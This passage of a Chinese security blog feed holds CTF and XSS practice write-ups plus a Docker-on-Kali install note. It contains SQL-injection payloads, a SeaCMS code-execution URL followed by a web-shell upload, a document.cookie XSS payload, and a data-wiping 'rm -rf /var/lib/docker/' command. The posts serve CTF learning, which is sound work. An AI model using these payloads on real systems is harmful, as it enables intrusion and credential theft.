class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flag_pic = Image.new(<span class="string">&quot;RGBA&quot;</span>,(<span class="number">143</span>,<span class="number">50</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fn <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):  <span class="comment">#循环出现文件名的后缀数字</span></span><br><span class="line"></span><br><span class="line">    fp=<span class="built_in">open</span>(<span class="string">r&#x27;/root/文档/CTF/fsj/fsj2/puzzle&#x27;</span>+<span class="built_in">str</span>(fn)+<span class="string">&#x27;.jpg&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)  <span class="comment">#此处为文件路径及文件名</span></span><br><span class="line"></span><br><span class="line">    all_data=<span class="built_in">bytearray</span>(fp.read())</span><br><span class="line"></span><br><span class="line">    data=all_data[-<span class="number">1250</span>:]                           <span class="comment">#读图片最后1250位</span></span><br><span class="line"></span><br><span class="line">    pic = Image.new(<span class="string">&quot;RGBA&quot;</span>,(<span class="number">50</span>,<span class="number">50</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))   <span class="comment">#新建图像对象,RGBA通道,xy轴为50,颜色为white(255,255,255)</span></span><br><span class="line"></span><br><span class="line">    dex=<span class="number">0</span>                                           <span class="comment">#初始化标记位为0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">25</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">25</span>):                       <span class="comment">#两层循环,写入图片上半部分颜色</span></span><br><span class="line"></span><br><span class="line">            pic.putpixel((j,i),(<span class="number">255</span>-data[dex],<span class="number">255</span>-data[dex],<span class="number">255</span>-data[dex])) <span class="comment">#设置坐标(j,i) 颜色为(255-data[dex],255-data[dex],255-data[dex])</span></span><br><span class="line"></span><br><span class="line">            dex=dex+<span class="number">1</span>                                                       <span class="comment">#标记位+1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">25</span>):                       <span class="comment">#两层循环,写入图片下半部分颜色</span></span><br><span class="line"></span><br><span class="line">            pic.putpixel((j,i+<span class="number">25</span>),(<span class="number">255</span>-data[dex],<span class="number">255</span>-data[dex],<span class="number">255</span>-data[dex]))  <span class="comment">#设置坐标(j,i+25) RGB值同上</span></span><br><span class="line"></span><br><span class="line">            dex=dex+<span class="number">1</span>                                                       <span class="comment">#标记位+1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">13</span>,<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> pic.getpixel((x,y)) &lt; pic.getpixel((x+<span class="number">13</span>,y)):    <span class="comment">#若x轴0~12的像素值 小于 13~25的值,则写入 0~12的像素值</span></span><br><span class="line"></span><br><span class="line">                flag_pic.putpixel((x+fn*<span class="number">13</span>,y),pic.getpixel((x,y)))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:                                               <span class="comment">#否则写入后 13~25的像素值</span></span><br><span class="line"></span><br><span class="line">                flag_pic.putpixel((x+fn*<span class="number">13</span>,y),pic.getpixel((x+<span class="number">13</span>,y)))</span><br><span class="line"></span><br><span class="line">flag_pic.show()</span><br></pre></td></tr></table></figure><p>得出<br><a href="https://i.loli.net/2019/05/06/5cd03841efaf8.png" title="欧鹏·曦文"><img src="https://i.loli.net/2019/05/06/5cd03841efaf8.png" alt="欧鹏·曦文" title="欧鹏·曦文"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Troubleshooting Docker Installation on Kali Linux</title>
      <link href="/2019/05/14/Troubleshooting-Docker-Installation-on-Kali-Linux/"/>
      <url>/2019/05/14/Troubleshooting-Docker-Installation-on-Kali-Linux/</url>
      
        <content type="html"><![CDATA[<p>Kali安装docker:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</span><br><span class="line">echo &#x27;deb https://apt.dockerproject.org/repo debian-stretch main&#x27; &gt; /etc/apt/sources.list.d/docker.list</span><br><span class="line">apt-get install apt-transport-https ca-certificates</span><br><span class="line">apt-get update &amp;&amp; sudo apt-get install docker-engine</span><br><span class="line">systemctl start docker</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用加速器加快镜像的下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi  /etc/docker/daemon.json</span><br><span class="line">输入一下内容即可</span><br><span class="line">&#123;&quot;registry-mirrors&quot;:[&quot;https://registry.docker-cn.com&quot;]&#125;</span><br></pre></td></tr></table></figure><h3 id="Error"><a href="#Error" class="headerlink" title="Error:"></a>Error:</h3><p>如果用完docker未通过正确方式关闭，导致下次docker无法开启，那么解决方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /var/lib/docker/</span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">add：</span><br><span class="line"> &#123; &quot;graph&quot;: &quot;/mnt/docker-data&quot;, &quot;storage-driver&quot;: &quot;overlay&quot; &#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Issues </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 Jiaweisi Cup Web</title>
      <link href="/2019/03/20/2019-Jiaweisi-Cup-Web/"/>
      <url>/2019/03/20/2019-Jiaweisi-Cup-Web/</url>
      
        <content type="html"><![CDATA[<p>由于时间关系大部分我只给出解题过程，图就不贴了</p><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>试了一下发现union 不行，那就试试<br>报错注入：<br>and 1&#x3D;(updatexml(1,concat(0x3a,(select database())),1)) #<br>发现爆库成功！<br>and 1&#x3D;(updatexml(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1)) #<br>爆表成功！<br>and 1&#x3D;(updatexml(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’flag’)),1)) #<br>爆列成功！<br>and 1&#x3D;(updatexml(1,concat(0x3a,(select group_concat(flag) from flag)),1)) #</p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>进入页面，发现被base64了，解码后，发现是JS加密，放入控制台得到flag</p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>频谱转换发现flag:….(一串字符) 但这并不是真正的flag，至于真正的flag我也没找到</p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>Base64很明显，我们只需一直解码即可，每组字数为5<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-c5fc16c5d40212f5.png" alt="img"></p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>。。。。</p><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>要计算，正则，得py得天下</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-705576ee4ca079f1.png" alt="img"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-28eb722e7bb32bd4.png" alt="img1"></p><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>。。。</p><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>你能解开这段密文吗？<br>ASCII差值<br>根据密文：<br>s——{<br>Z——c<br>*——4<br>Z——e<br>g——s<br>‘——4<br>d——r<br>b——f<br>g——l<br>[——a<br>&#96;——g</p><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>。。。</p><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>。。。</p><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p>抓包 发现隐藏的代码<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-5e34a9fbf7ecf483.png" alt="img"><br>这串呢?一上来就把你传的参数转化为string类型，所以用数组的方法是不行了。<br>只能是MD5碰撞了，就是不相同的字符恰好有着一样的MD5。fastcoll_v1.0.0.5.exe工具可以给弄出来。<br>但是别忘了url<br>param1&#x3D;%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF&#x2F;a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP&amp;param2&#x3D;%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF&#x2F;a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d706e963fd888e1a.png" alt="img"></p><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p>。。。</p><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>逆序解码base64,发现是1，</p><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p>发现是海洋CMS漏洞<br>搜索漏洞找了一个版本的<br>构造payload<br><a href="http://47.103.43.235:84/search.php?searchtype=5&amp;searchword=%7Bif%7Bsearchpage:year%7D&amp;year=:e%7Bsearchpage:area%7D%7D&amp;area=v%7Bsearchpage:letter%7D&amp;letter=al%7Bsearchpage:lang%7D&amp;yuyan=(join%7Bsearchpage:jq%7D&amp;jq=($_P%7Bsearchpage:ver%7D&amp;&amp;ver=OST%5B9%5D))">http://47.103.43.235:84/search.php?searchtype=5&amp;searchword=%7Bif%7Bsearchpage:year%7D&amp;year=:e%7Bsearchpage:area%7D%7D&amp;area=v%7Bsearchpage:letter%7D&amp;letter=al%7Bsearchpage:lang%7D&amp;yuyan=(join%7Bsearchpage:jq%7D&amp;jq=($_P%7Bsearchpage:ver%7D&amp;&amp;ver=OST%5B9%5D))</a><br>上传一句话，菜刀连接，</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-213c2975a00ad29d.png" alt="img"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-8de5ebc3b037d719.png" alt="img"></p><p>根目录下发现flag文件</p><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d71e0956ff4c88c0.png" alt="img"><br>抓包发现，我们打开发现<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d5d9fe7a9bdf98e4.png" alt="img"></p><p>分析代码逻辑，发现POST了两个字段name和password，获得flag要求的条件是：name !&#x3D; password &amp; sha1(name) &#x3D;&#x3D; sha1(password)，乍看起来这是不可能的，其实可以利用sha1()函数的漏洞来绕过。如果把这两个字段构造为数组，如：?name[]&#x3D;a&amp;password[]&#x3D;b，这样在第一处判断时两数组确实是不同的，但在第二处判断时由于sha1()函数无法处理数组类型，将报错并返回false，if 条件成立，获得flag。<br>经验证md5()函数同样存在此漏洞。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-Wooyun Practice</title>
      <link href="/2019/03/14/XSS-Wooyun-Practice/"/>
      <url>/2019/03/14/XSS-Wooyun-Practice/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="&lt;1&gt;"></a>&lt;1&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/1.php?umod=commentsoutlet&act=count&siteid=3&libid=9&dataid=1480&score=1&func=haoping&_=1353475261886">点击进入本例模拟环境</a></p><h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><p>经过测试，我们发现，当在score后输入&lt;&gt;HTML标签时，查看源码，发现<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-146fd79b3e828812.png" alt="图片.png"><br>这便说明存在XSS漏洞，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-165da5857bda9eaf.png" alt="图片.png"></p><h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><blockquote><p>a. 通常，我们只需要在输出前，将 &lt; , &gt; 过滤掉即可。<br>b. 这类XSS在小型网站中比较常见，在大型网站中少见。<br>c. 这类XSS通常都被浏览器的XSS过滤器秒杀了，所以一般来说，威力较小。<br>d. 对于普通用户来说，请使用IE8及以上版本（并开启XSS过滤器功能，默认开启），或chrome浏览器，将可以防御大部分此种类型的XSS攻击。</p></blockquote><h2 id="-1"><a href="#-1" class="headerlink" title="&lt;2&gt;"></a>&lt;2&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/2.php?callback=wooyun">点击进入本例模拟环境</a></p><h3 id="测试方法-1"><a href="#测试方法-1" class="headerlink" title="测试方法"></a>测试方法</h3><p>输入aaaaaa&lt;&gt;我们发现出现位置如下<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-4a74c579a0bc17f4.png" alt="图片.png"></p><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>1 首先判断，是否过滤了 &lt; , &gt; , &#x2F; 等符号，<br>2 如果都没有过滤，恭喜你，一般可以直接XSS了。代码如下：<br><code>http://activity.soso.com/common/setParentsInfo.php?callback=aaaaaaaaa&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-55230f15cb0919eb.png" alt="图片.png"></p><p><strong>但是天有不测风雨， 如果过滤了 &lt;, &gt;，那么就无法使用上面的办法了</strong></p><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><p>构造js代码：<br><code>eval(&#39;alert(1)&#39;);void</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-e56b7d25794f2ef4.png" alt="图片.png"><br><strong>payload是不固定的，也就是说，我们插入的内容，使得这一段javascript依然【语法正确】，能够【正确执行】，并且能够执行【我们所插入的JS代码】，这样我们的目的就达到了。<br>类似于var a&#x3D;”[输出]”; &#x2F;&#x2F; 不过通常程序员会把 “ 过滤掉， 这样的话，一般来说，我们就很难构造。</strong></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 过滤 &lt;/xxx&gt; 组合 </span><br><span class="line">2. 针对输出在不同的场景，进行合适的过滤。 </span><br></pre></td></tr></table></figure><h2 id="-2"><a href="#-2" class="headerlink" title="&lt;3.1&gt;"></a>&lt;3.1&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/3.1.php?word=%E4%B9%8C%E4%BA%91%E6%AC%A2%E8%BF%8E%E6%82%A8">点击进入本例模拟环境 3.1</a></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>输入&lt;&gt;，发现被过滤了，查看源码发现，双引号不会被过滤，故我们因此构想payload</p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-0b776c42fbc43c3b.png" alt="图片.png"><br>当用户点击这个文本框时，就会触发 XSS</p><h2 id="-3"><a href="#-3" class="headerlink" title="&lt;3.2&gt;"></a>&lt;3.2&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/3.2.php?c=follow&a=index&appkey=801004516&bg=ffffff&hsize=80&name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qingfengxu6685,zhouzhichen001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx">点击进入本例模拟环境 3.2</a></p><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>输入&lt;&gt;&#x2F;“(),发现只有&#x2F;没有被过滤，如何只用 \ 构造利用语句呢，我们可以想到CSS 中的字符编码，CSS 提供了一套转义处理策略，一个反斜杠后边跟1~6位十六进制数字。然后利用CSS 的expression 来调用JavaScript 代码。也就是试图构造出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expression(eval(alert(/xss/))</span><br></pre></td></tr></table></figure><h3 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h3><p>完整的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body style=&quot;... background-color:;width:expression(eval(alert(/xss/)))&quot;&gt;</span><br></pre></td></tr></table></figure><p>完整的payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bg=;w:expr\65ssion\28%20eval\28\27\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\64\6f\63\75\6d\65\6e\74\2e\63\6f\6f\6b\69\65\29\3b\77\69\6e\64\6f\77\2e\78\3d\31\7d\27\29\29</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用分号来结束backgroud-color,然后 w: 后边跟上expression,如果expression 要被过滤，那就加上转义，把expression 随意变下形就可以，于是，在下边这样的代码构造下，漏洞又被利用了。</p><p>试了很多次，发现一直不出现XSS，原来</p><blockquote><p>expression 当年是微软搞出来的技术，但是一直没被其他浏览器接受，同时，甚至微软自己如今也抛弃了这种特性，它出现在IE6，IE7，和IE8的一些早期版本，因为微软官方也认为该属性不具有通用性，而且它处理的事务，如今已经能够在CSS 中正常的完成，如min-width,max-width， 这些都已经在IE8之后得到很好的支持，所以expression 也只能在这两个古老版本上起效。</p></blockquote><h2 id="-4"><a href="#-4" class="headerlink" title="&lt;3.3&gt;"></a>&lt;3.3&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/3.3.php?searchtype_yjbg=yjjg&searchvalue_yjbg=wooyun">点击进入本例模拟环境 3.3</a></p><h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><p>输入aaaaaaaa&lt;&gt;’&#x2F;“()测试<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-c5404d1c9683848b.png" alt="图片.png"><br>根据测试，我们发现只有&#x2F;,(),’这三个符号没被过滤，而且攻击点在第二个等于后面。<br>……..&amp;searchvalue_yjbg&#x3D;aaaaaa’</p><p>…….&amp;searchvalue_yjbg&#x3D;aaaaaa’+alert(1)+’’</p><p>……..&amp;searchvalue_yjbg&#x3D;aaaaaa&#x27;+alert(1)+&amp;#x27</p><h3 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h3><p>&amp;: %26, #: %23,+:%2b,’:%27<br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaa%26%23x27;%2balert(1)%2b%26%23x27</span><br></pre></td></tr></table></figure><p>由于缺陷点是发生在 onkeydown 或 a 标签的 href 属性中，无法自动触发，因而使得威胁减小，如果是发生在 img 的 onload 属性，则非常可能导致自动触发，故需手动点击GO触发XSS。</p><h3 id="修复方法-综合以上三个"><a href="#修复方法-综合以上三个" class="headerlink" title="修复方法(综合以上三个)"></a>修复方法(综合以上三个)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 对于输出在HTML属性中的情况，需要特殊情况特殊对待，该过滤\的时候，请过滤\, 该过滤&amp;的情况，则过滤掉&amp;</span><br><span class="line">2. 碰到有某些修复的人用正则去判断， &amp;#xNNN.., 而实际上 &amp;#x0NN; &amp;#x00NN, （后面自己慢慢试。。） 都是可以的。 或者是 &amp;#10进制; 以及一些特殊的HTML实体，如 &amp;quot;等，都要注意到，好麻烦， 最好的办法，还是 &amp;过滤为 &amp;amp; ：） </span><br></pre></td></tr></table></figure><h2 id="-5"><a href="#-5" class="headerlink" title="&lt;4&gt;"></a>&lt;4&gt;</h2><h3 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h3><p>输入&lt;&gt;’&#x2F;()“<br>发现”&lt;&gt;被过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&quot;alert(1)</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-e458edaebaf15da7.png" alt="图片.png"><br>我们发现还有一个”没有闭合，但是直接加上”，会被过滤，所以我们想到&#x2F;&#x2F;注释符号将它注释即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&quot;alert(1)//</span><br></pre></td></tr></table></figure><p>发现还不行<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-4512beb2556d627e.png" alt="图片.png"><br>不难想到这是代码，结尾要用;，故</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&quot;;alert(1)//</span><br></pre></td></tr></table></figure><h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><p>修复相关过滤机制。</p><h1 id="-6"><a href="#-6" class="headerlink" title="&lt;5&gt;"></a>&lt;5&gt;</h1><p><a href="http://mail.qq.com/cgi-bin/login?vt=passport&ss=aaa&from=bbb&delegate_url=/cgi-bin/frame_html?url=%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1">这道题不能用</a><br>由于网站问题，本题只出示思路。</p><h3 id="测试-4"><a href="#测试-4" class="headerlink" title="测试"></a>测试</h3><p>输入常用符号，经过测试，我们可以看到，双引号是用不了， 但是 反斜线还可以使用。\可以用</p><h3 id="提取缺陷代码"><a href="#提取缺陷代码" class="headerlink" title="提取缺陷代码"></a>提取缺陷代码</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">getTop</span>().<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=&quot;</span>+<span class="string">&quot;&amp;t=&quot;</span>+<span class="string">&quot;&amp;alias=&quot;</span>+<span class="string">&quot;&amp;regalias=&quot;</span>+<span class="string">&quot;&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%252Fcgi-bin%252Fsetting10%253Faction%253Dlist%2526t%253Dsetting10%2526ss%253Dindex%2526Mtype%253D1%2526clickpos%253D20%2526loc%253Ddelegate%252Cwebmap%252C%252C1&quot;</span>+<span class="string">&quot;&amp;title=&quot;</span>+<span class="string">&quot;&amp;url=%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26ss%3Daaa%2522%26from%3Dbbb%5C%26delegate_url%3D%252Fcgi-bin%252Fframe_html%253Furl%253D%2525252Fcgi-bin%2525252Fsetting10%2525253Faction%2525253Dlist%25252526t%2525253Dsetting10%25252526ss%2525253Dindex%25252526Mtype%2525253D1%25252526clickpos%2525253D20%25252526loc%2525253Ddelegate%2525252Cwebmap%2525252C%2525252C1&quot;</span>+<span class="string">&quot;&amp;org_fun=&quot;</span>+<span class="string">&quot;&amp;aliastype=&quot;</span>+<span class="string">&quot;&amp;ss=aaa&quot;</span>+<span class="string">&quot;&amp;from=bbb&quot;</span>+<span class="string">&quot;&amp;param=&quot;</span>+<span class="string">&quot;&amp;sp=6fa57ce5b3047ebMTM1NTQwOTA2Mg&quot;</span>+<span class="string">&quot;&amp;r=3ec785174fff5206ed6f0cf4a8c5e3c5&quot;</span>+<span class="string">&quot;&amp;ppp=&quot;</span>+<span class="string">&quot;&amp;secpp=&quot;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="缺陷部分"><a href="#缺陷部分" class="headerlink" title="缺陷部分"></a>缺陷部分</h3><p>“………”+”&amp;ss&#x3D;aaaa”+”&amp;from&#x3D;bbb”+”&amp;param&#x3D;”;</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>反斜线是用来表示转义，我们要控制aaaa但是不能使用双引号，这时就可以用反斜线进行对双引号的转义，<br>语法发生变化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;getTop().location.href=&quot;......&quot;+ &quot;&amp;ss=aaa\&quot;+&quot; &amp;from=bbb &quot;+&quot; ¶m= &quot;+&quot; .....&quot;;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这样看起来虽然前面的语法正确，但是后面的语句却不太正常，故，我们只需使用&#x2F;&#x2F;将后面的语句进行注释即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from=1//&quot;+&quot;¶m=&quot;;</span><br></pre></td></tr></table></figure><p>但是还有一个问题，&amp; 在这里，被考虑成了一个与操作，优先级是高于 &#x3D;号的，变成了(“字符串”&amp;from)&#x3D;1 的语法，这仍然是错误的。但是，如果我们再测试一下，&#x3D; 号会不会被屏蔽呢，&#x3D;号也可以用，那么我们改变一下语法，添加一个等号，变成 &#x3D;&#x3D;：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1//&quot;+&quot;¶m=&quot;;</span><br></pre></td></tr></table></figure><p>于是语法编程了(“string”)&amp;(from&#x3D;&#x3D;1)的样式，from 变成了一个bool操作，但现在又面临了新的问题，如果你在URL 里本来该是一个定义的操作，却变成了一个判断的操作，from 就变成了未定义的状态了，语法仍然会报错，这我们就要进一步理解JavaScript的语法了，如果我们把from 当做一个变量或者是方法，如果是方法，无论在何处定义，都会被拉到最简便，利用这样一个特性，我们的代码可以改改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;function from()&#123;&#125;//&quot;+&quot;&amp;param=&quot;;</span><br></pre></td></tr></table></figure><p>这样一来，我们的 function from(){} 就会被提前解析，从而定义了from, 后面 